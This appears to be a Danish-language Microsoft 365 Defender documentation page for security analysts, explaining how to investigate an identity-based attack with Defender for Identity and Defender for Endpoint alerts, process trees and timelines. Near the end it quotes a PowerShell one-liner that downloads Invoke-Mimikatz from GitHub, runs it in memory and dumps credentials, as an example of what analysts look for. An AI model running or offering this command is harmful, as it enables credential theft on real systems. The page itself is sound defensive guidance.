---
title: Eksempel på et identitetsbaseret angreb
description: Gennemgå en eksempelanalyse af et identitetsbaseret angreb.
keywords: hændelser, beskeder, undersøge, korrelation, angreb, maskiner, enheder, brugere, identiteter, identitet, postkasse, mail, 365, microsoft, m365, hændelsesrespons, cyberangreb
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 883c0480b5f8cb35abfe59458d35c8d1274b8493
ms.sourcegitcommit: bdd6ffc6ebe4e6cb212ab22793d9513dae6d798c
ms.translationtype: MT
ms.contentlocale: da-DK
ms.lasthandoff: 03/08/2022
ms.locfileid: "63595916"
---
# <a name="example-of-an-identity-based-attack"></a>Eksempel på et identitetsbaseret angreb

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Gælder for:**
- Microsoft 365 Defender

Microsoft Defender for Identity kan hjælpe med at registrere ondsindede forsøg på at kompromittere identiteter i organisationen. Da Defender for Identity er integreret med Microsoft 365 Defender, kan sikkerhedsanalytikere få indsigt i trusler, der kommer fra Defender for Identity, f.eks. mistænkelige forsøg på at øge tilladelser for Netlogon.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Analyse af angrebene i Microsoft Defender for Identity

Microsoft 365 Defender gør det muligt for analytikere at filtrere beskeder ved at registrere **kilden** på fanen Beskeder på siden Hændelser. I følgende eksempel filtreres registreringskilden til **Defender for Identity**. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Eksempel på filtrering af registreringskilden for Defender for Identity.":::

Når du vælger **beskeden om mistænkelig overadgang til hash-angreb** , går det til en side i Microsoft Defender til skyapps, hvor der vises mere detaljerede oplysninger. Du kan altid få mere at vide om en besked eller et angreb ved  at vælge Få mere at vide om denne beskedtype for at læse en beskrivelse af angrebene samt forslag til afhjælpning.[](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002)
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Eksempel på en mistænkelig overadgangsmeddelelse om hash-angreb."::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Undersøger det samme angreb i Microsoft Defender til slutpunkt

Alternativt kan en analytiker bruge Defender til Slutpunkt til at få mere at vide om aktiviteten på et slutpunkt. Vælg hændelsen fra hændelseskøen, og vælg **derefter fanen Vigtige** beskeder. Herfra kan de også identificere registreringskilden. En registreringskilde, der er mærket Slutpunktsregistrering og -svar, står for Slutpunktsregistrering og -svar, som er Defender til slutpunkt. Herfra vælger analytikeren en besked, der er registreret af Slutpunktsregistrering og -svar.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Eksempel på registrering af slutpunkt og svar i Defender til slutpunkt."::: 

Siden med beskeder viser forskellige relevante oplysninger, som f.eks. den på påvirkede enheds navn, brugernavn, status for automatisk undersøgelse og oplysningerne om beskeden. Beskedens historie viser en visuel repræsentation af procestræet. Procestræet er en hierarkisk hierarkisk repræsentation af overordnede og underordnede processer, der er relateret til beskeden.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Eksempel på et advarselsprocestræ i Defender til slutpunkt."::: 

Hver proces kan udvides for at få vist flere detaljer. Detaljer, som en analytiker kan se, er de faktiske kommandoer, der blev indtastet som en del af et skadeligt script, IP-adresser til udgående forbindelse og andre nyttige oplysninger.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Eksempel på procesdetaljer i Defender til slutpunkt.":::
 
Ved at vælge **Se på tidslinjen** kan en analytiker analysere yderligere for at fastlægge det nøjagtige tidspunkt for kompromiset. 

Microsoft Defender til Slutpunkt kan registrere mange skadelige filer og scripts. På grund af mange legitime anvendelser til udgående forbindelser, PowerShell og kommandolinjeaktivitet betragtes visse aktiviteter som gode, indtil der oprettes en skadelig fil eller aktivitet. Brug af tidslinjen hjælper derfor analytikere med at sætte beskeden ind i konteksten med den omgivende aktivitet for at bestemme den oprindelige kilde eller klokkeslæt for de angreb, der ellers er skjult af almindeligt filsystem og brugeraktivitet. 

For at gøre dette begynder en analytiker på tidspunktet for registrering af påmindelser (med rødt) og ruller nedad i tide for at afgøre, hvornår den oprindelige aktivitet, der førte til den ondsindede aktivitet, faktisk startede. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Eksempel på at starte på tidspunktet for registrering af beskeden."::: 

Det er vigtigt at forstå og skelne mellem almindelig aktivitet som f.eks. Windows Opdateringsforbindelser, trafik til aktivering af Windows, der er tillid til, andre almindelige forbindelser til Microsoft-websteder, internetaktivitet fra tredjepart, Microsoft Endpoint Configuration Manager-aktivitet og anden godartet aktivitet fra mistænkelig aktivitet. En måde at gøre dette på er ved hjælp af tidslinjefiltre. Der er mange filtre, der kan fremhæve bestemt aktivitet, mens der filtreres fra alt, hvad analytikeren ikke vil have vist. 

På billedet nedenfor filtrerede analytikeren for kun at få vist netværks- og proceshændelser. Dette giver analytikeren mulighed for at se de netværksforbindelser og processer, der omgiver begivenheden, Notesblok etableret en forbindelse til en IP-adresse, som vi også så i procestræet. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Eksempel på, Notesblok blev brugt til at oprette en ondsindet udgående forbindelse."::: 

I denne bestemte hændelse blev Notesblok brugt til at oprette en skadelig udgående forbindelse. Dog vil hackere ofte blot bruge iexplorer.exe til at etablere forbindelser til at downloade en ondsindet nyttedata, fordi iexplorer.exe-processer betragtes som almindelig aktivitet i webbrowseren.

Et andet element, der skal søges efter på tidslinjen, er PowerShell bruger til udgående forbindelser. Analytikeren leder efter vellykkede PowerShell-forbindelser `IEX (New-Object Net.Webclient)` med kommandoer som f.eks. efterfulgt af en udgående forbindelse til et websted, der er vært for en skadelig fil. 

I følgende eksempel blev PowerShell brugt til at downloade og udføre Mimikatz fra et websted:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
En analytiker kan hurtigt søge efter nøgleord ved at skrive nøgleordet i søgefeltet for kun at få vist begivenheder, der er oprettet med PowerShell. 

## <a name="next-step"></a>Næste trin

Se stien [til phishingundersøgelse](first-incident-path-phishing.md) .

## <a name="see-also"></a>Se også

- [Oversigt over hændelser](incidents-overview.md)
- [Administrer hændelser](manage-incidents.md)
- [Undersøg hændelser](investigate-incidents.md)
